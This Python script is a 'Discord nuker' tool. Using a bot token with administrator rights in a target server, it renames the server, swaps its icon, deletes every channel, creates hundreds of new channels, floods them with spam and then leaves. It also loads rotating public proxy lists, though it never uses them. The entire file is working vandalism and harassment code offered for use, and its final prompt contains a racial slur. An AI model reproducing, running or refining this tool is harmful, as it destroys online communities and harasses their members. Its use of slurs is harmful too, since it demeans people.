import sys
import asyncio
import os
import random
import aiohttp
from pystyle import Colors, Colorate, Center
import discord
from discord.ext import commands
from colorama import Fore, Style, init
from itertools import cycle

init(autoreset=True)

class DiscordNuker:
    def __init__(self):
        self.banner = r"""
███▄▄▄▄   ███    █▄     ▄█   ▄█▄    ▄████████ 
███▀▀▀██▄ ███    ███   ███ ▄███▀   ███    ███ 
███   ███ ███    ███   ███▐██▀     ███    █▀  
███   ███ ███    ███  ▄█████▀     ▄███▄▄▄     
███   ███ ███    ███ ▀▀█████▄    ▀▀███▀▀▀     
███   ███ ███    ███   ███▐██▄     ███    █▄  
███   ███ ███    ███   ███ ▀███▄   ███    ███ 
 ▀█   █▀  ████████▀    ███   ▀█▀   ██████████ 
                       ▀                      
            by vantixt
"""
        self.token = ""
        self.new_name = "vantixt was here"
        self.image_path = ""
        self.spam_message = ""
        self.channel_prefix = "vantixt"
        self.channel_count = 300
        self.spam_per_channel = 5
        self.leave_after = True
        self.proxy_list = []
        self.proxy_cycle = None
        self.bot = None
        self.session = None

    def clear(self):
        os.system('cls' if os.name == 'nt' else 'clear')

    async def fetch_proxies(self):
        print(Colorate.Horizontal(Colors.red_to_white, "[+] Grabbing fresh proxies..."))
        sources = [
            "https://api.proxyscrape.com/v2/?request=getproxies&protocol=http&timeout=10000&country=all",
            "https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/http.txt",
            "https://raw.githubusercontent.com/clarketm/proxy-list/master/proxy-list-raw.txt",
            "https://raw.githubusercontent.com/monosans/proxy-list/main/proxies/http.txt"
        ]
        proxies = []
        async with aiohttp.ClientSession() as sess:
            for url in sources:
                try:
                    async with sess.get(url, timeout=15) as r:
                        if r.status == 200:
                            text = await r.text()
                            for line in text.splitlines():
                                line = line.strip()
                                if line and ":" in line:
                                    proxies.append(line)
                except:
                    continue
        self.proxy_list = list(set(proxies))
        random.shuffle(self.proxy_list)
        self.proxy_cycle = cycle(self.proxy_list) if self.proxy_list else None
        print(Colorate.Horizontal(Colors.red_to_white, f"[+] Loaded {len(self.proxy_list)} proxies – rotating automatically"))

    def get_proxy(self):
        if self.proxy_cycle:
            return f"http://{next(self.proxy_cycle)}"
        return None

    def gradient(self, text):
        return Colorate.Horizontal(Colors.red_to_white, text)

    def display_menu(self):
        self.clear()
        print(self.gradient(Center.XCenter(self.banner)))
        print("\n")
        print(self.gradient(Center.XCenter("vantixt nuker – clean & deadly")))
        print("\n")

    def get_inputs(self):
        self.clear()
        self.display_menu()

        self.token = input(self.gradient("Bot Token → ")).strip()
        if not self.token:
            exit(self.gradient("Token empty. Bye."))

        self.image_path = input(self.gradient("Path to server icon (leave empty to skip) → ")).strip()
        self.new_name = input(self.gradient("New server name (default: vantixt was here) → ")).strip() or "vantixt was here"
        self.spam_message = input(self.gradient("Spam message → ")).strip()
        if not self.spam_message:
            exit(self.gradient("Spam message empty. Bye."))
        self.channel_prefix = input(self.gradient("Channel prefix (default: vantixt) → ")).strip() or "vantixt"

        try:
            cnt = input(self.gradient("How many channels (default 300) → ")).strip()
            self.channel_count = int(cnt) if cnt else 300
            spm = input(self.gradient("Messages per channel (default 5) → ")).strip()
            self.spam_per_channel = int(spm) if spm else 5
        except:
            pass

        leave = input(self.gradient("Leave server after nuke (y/n, default n) → ")).strip().lower()
        self.leave_after = leave != "n"

    async def delete_all_channels(self, guild):
        print(self.gradient(f"\n[+] Deleting all channels in {guild.name}"))
        deleted = 0
        tasks = []
        for channel in guild.channels:
            async def delete_one(ch=channel):
                nonlocal deleted
                try:
                    await ch.delete()
                    deleted += 1
                    print(self.gradient(f"[+] Deleted: {ch.name}"))
                except:
                    pass
                await asyncio.sleep(0.8)  
            tasks.append(delete_one())
        await asyncio.gather(*tasks, return_exceptions=True)
        print(self.gradient(f"\n[+] Channel deletion done – {deleted}/{len(guild.channels)} removed"))
        await asyncio.sleep(3)  

    async def change_server(self, guild):
        print(self.gradient("\n[+] Changing server name & icon."))
        try:
            await guild.edit(name=self.new_name)
            print(self.gradient(f"[+] Name → {self.new_name}"))
        except:
            print(self.gradient("[-] Failed to change name"))

        if self.image_path and os.path.exists(self.image_path):
            try:
                with open(self.image_path, "rb") as f:
                    await guild.edit(icon=f.read())
                print(self.gradient("[+] Icon changed"))
            except:
                print(self.gradient("[-] Failed to change icon"))
        else:
            print(self.gradient("[*] No icon path – skipped"))
        await asyncio.sleep(2)

    async def create_and_spam(self, guild):
        print(self.gradient(f"\n[+] Creating {self.channel_count} channels + spamming while creating"))
        created_channels = []
        sem = asyncio.Semaphore(20)

        async def create_one():
            async with sem:
                try:
                    ch = await guild.create_text_channel(f"{self.channel_prefix}-{random.randint(1000,99999)}")
                    created_channels.append(ch)
                    print(self.gradient(f"[+] Created: {ch.name}"))
                except:
                    pass
                await asyncio.sleep(1.0)  

       
        create_tasks = [create_one() for _ in range(self.channel_count)]
        await asyncio.gather(*create_tasks, return_exceptions=True)

        print(self.gradient(f"\n[+] All channels created – starting spam in {len(created_channels)} channels"))

        sem = asyncio.Semaphore(50)
        async def spam_one(ch):
            async with sem:
                for _ in range(self.spam_per_channel):
                    try:
                        await ch.send(self.spam_message)
                    except:
                        pass
                    await asyncio.sleep(0.7)  

        spam_tasks = [spam_one(ch) for ch in created_channels]
        await asyncio.gather(*spam_tasks, return_exceptions=True)

        print(self.gradient("\n[+] Spam finished – server is toast"))

    async def leave_server(self, guild):
        print(self.gradient(f"\n[+] Leaving {guild.name}..."))
        try:
            await guild.leave()
            print(self.gradient("[+] Left successfully"))
        except:
            print(self.gradient("[-] Could not leave"))

    async def nuke(self, guild):
        print(self.gradient(f"\n[!] STARTING NUKE ON: {guild.name} ({guild.id}) [!]"))
        if not guild.me.guild_permissions.administrator:
            print(self.gradient("[-] Bot has no admin – aborting"))
            return

        await self.change_server(guild)
        await self.delete_all_channels(guild)
        await self.create_and_spam(guild)
        if self.leave_after:
            await self.leave_server(guild)

        print(self.gradient(f"\n[!] nuke done – {guild.name} is dead [!]"))

    async def close_session(self):
        if self.session and not self.session.closed:
            await self.session.close()

    def run(self):
        intents = discord.Intents.default()
        intents.guilds = True
        intents.message_content = True
        self.bot = commands.Bot(command_prefix="!", intents=intents)

        @self.bot.event
        async def on_ready():
            self.clear()
            self.display_menu()
            print(self.gradient(Center.XCenter(f"[+] Bot online: {self.bot.user}")))

            if not self.bot.guilds:
                print(self.gradient(Center.XCenter("Bot not in any server – invite it first")))
                input(self.gradient("\nenter to exit"))
                return

            for i, g in enumerate(self.bot.guilds, 1):
                print(self.gradient(Center.XCenter(f"[{i}] {g.name} ({g.id}) – {len(g.members)} members")))

            while True:
                try:
                    choice = int(input(self.gradient("\nServer number → "))) - 1
                    if 0 <= choice < len(self.bot.guilds):
                        break
                except:
                    pass

            target = self.bot.guilds[choice]
            confirm = input(self.gradient(f"\nnuke '{target.name}'? Type 'yes' → ")).strip().lower()
            if confirm != "yes":
                print(self.gradient("Cancelled"))
                await self.bot.close()
                return

            connector = aiohttp.TCPConnector(limit=100, force_close=True)
            self.session = aiohttp.ClientSession(connector=connector)
            await self.fetch_proxies()
            await self.nuke(target)
            await self.close_session()
            input(self.gradient("\ndone enter to exit nigga"))
            await self.bot.close()

        try:
            self.bot.run(self.token)
        except discord.LoginFailure:
            print(self.gradient("Invalid token"))
        except Exception as e:
            print(self.gradient(f"Error: {e}"))
        finally:
            asyncio.run(self.close_session())

if __name__ == "__main__":
    nuker = DiscordNuker()
    nuker.get_inputs()
    nuker.run()
